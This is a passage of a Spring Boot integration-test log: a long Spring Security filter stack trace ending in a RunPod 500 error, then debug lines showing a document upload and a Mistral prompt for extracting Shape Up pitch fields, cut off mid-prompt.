	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.DocumentControllerIntegrationTest.extractPitchData_withTextDocument_shouldExtractShapeUpFields(DocumentControllerIntegrationTest.java:269) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]
Caused by: java.lang.RuntimeException: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:44.950958","status":500}
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.submitJob(RunPodChatModel.java:128) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.generate(RunPodChatModel.java:81) ~[classes/:na]
	... 197 common frames omitted

2026-01-17T23:26:44.997Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Embedded knowledge item: document_7_0
2026-01-17T23:26:44.997Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Ingested document: pitch.txt (ID: 7)
2026-01-17T23:26:44.997Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.DocumentService   : Document uploaded successfully: pitch.txt (txt)
2026-01-17T23:26:44.997Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.PitchShapingExtractorService   : Extracting pitch data from document (45 chars)
2026-01-17T23:26:44.997Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : Submitting prompt to RunPod: 1438 chars
2026-01-17T23:26:44.997Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : RunPod request payload: {"input":{"max_tokens":2048,"temperature":0.3,"model":"mistral:instruct","prompt":"You are an expert at analyzing Shape Up methodology pitch documents.\n\nAnalyze the following document and extract the key pitch elements according to Shape Up methodology.\n\nExtract the following elements (use null if not found in the document):\n\n1. **title**: A concise title for the pitch (extract or generate from content)\n2. **problemStatement**: The problem being solved. What is the pain point? Why does this matter?\n3. **solution**: The proposed solution. What is being built? Include any described approach or fat-marker sketch ideas.\n4. **rabbitHoles**: Areas to avoid, edge cases that should be out of scope, potential time sinks.\n5. **risks**: Known risks, technical challenges, unknowns, or dependencies.\n6. **noGos**: Things explicitly out of scope. What we are NOT building.\n7. **appetiteDays**: Estimated time appetite in days (if mentioned). Default to null if not specified.\n8. **wireframeLinks**: Any mentioned links to wireframes, prototypes, Figma, or visual references.\n\nDOCUMENT CONTENT:\n---\nProblem: Test problem\nSolution: Test 